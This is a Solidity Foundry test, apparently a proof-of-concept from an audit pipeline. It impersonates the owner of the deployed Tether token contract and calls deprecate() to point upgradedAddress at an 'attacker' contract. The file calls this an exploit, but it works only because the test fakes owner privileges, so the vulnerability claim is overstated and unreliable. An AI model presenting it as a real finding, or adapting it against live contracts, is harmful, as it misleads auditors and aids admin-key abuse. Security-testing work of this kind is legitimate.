// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITetherToken {
    function deprecated() external view returns (bool);
    function upgradedAddress() external view returns (address);
    function owner() external view returns (address);
    function deprecate(address _upgradedAddress) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address attacker = address(this);
    ITetherToken tether;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        tether = ITetherToken(TARGET);
        vm.label(TARGET, "TetherToken");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the current owner
        address owner = tether.owner();
        vm.label(owner, "Contract Owner");

        // Impersonate the owner
        vm.startPrank(owner);

        // Call deprecate with attacker's address to redirect all token operations
        address maliciousUpgrade = attacker;
        tether.deprecate(maliciousUpgrade);

        vm.stopPrank();

        // Verify the exploit worked - oracle checks deprecated == true
        assertEq(tether.deprecated(), true, "deprecated should be true after deprecate() call");
        assertEq(tether.upgradedAddress(), maliciousUpgrade, "upgradedAddress should point to attacker's contract");

        // Demonstrate that token operations now delegate to the malicious contract
        // This shows the severity - all transfers/approvals now go through unreviewed code
        emit log_named_address("All token operations now delegate to:", tether.upgradedAddress());
        assertEq(tether.deprecated(), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
